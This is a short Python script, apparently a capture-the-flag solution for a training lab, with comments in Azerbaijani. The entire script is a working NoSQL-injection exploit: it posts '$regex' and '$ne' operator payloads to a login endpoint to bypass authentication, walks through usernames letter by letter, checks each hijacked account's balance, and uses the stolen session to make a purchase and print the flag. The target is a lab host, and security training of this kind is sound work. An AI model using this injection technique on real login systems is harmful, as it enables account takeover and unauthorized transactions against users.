import requests
import sys

# URL-lər
BASE_URL = "http://web0x01.hbtn/api/a3/nosql_injection"
LOGIN_URL = f"{BASE_URL}/login"
ME_URL = f"{BASE_URL}/me"
CRYPTO_URL = f"{BASE_URL}/crypto"

# Axtarış üçün hərflər (a-dan z-yə)
chars = "abcdefghijklmnopqrstuvwxyz"

print("[*] Varlı istifadəçi axtarılır...")

for char in chars:
    # 1. Login olmağa çalışırıq (Regex ilə)
    payload = {
        "username": {"$regex": f"^{char}"},
        "password": {"$ne": ""}
    }
    
    try:
        # Redirect-i söndürürük ki, cookie-ni tutaq
        s = requests.Session()
        r = s.post(LOGIN_URL, json=payload, allow_redirects=False)
        
        # Əgər sessiya yaranıbsa
        if r.status_code in [200, 204, 302]:
            # 2. Balansı yoxlayırıq
            me_req = s.get(ME_URL)
            
            if me_req.status_code == 200:
                data = me_req.json()
                username = data.get("username", "naməlum")
                balance = data.get("balance", 0)
                
                print(f"[+] Tapıldı: '{username}' | Balans: {balance}")
                
                # Əgər balansı varsa, coin alırıq
                if balance > 0:
                    print(f"[*] {username} üçün Coin alınır...")
                    buy_payload = {"amount": 1, "currency": "HBTNc"}
                    buy_req = s.post(CRYPTO_URL, json=buy_payload)
                    
                    if buy_req.status_code in [200, 201]:
                        print("\n" + "="*40)
                        print("JACKPOT! FLAG AŞAĞIDADIR:")
                        print(buy_req.text)  # Flag burada olacaq
                        print("="*40 + "\n")
                        sys.exit() # Proqramı dayandır
            else:
                # 204 qaytarırsa, deməli user boşdur
                pass

    except Exception as e:
        print(f"Xəta: {e}")

print("[-] Təəssüf ki, heç nə tapılmadı.")
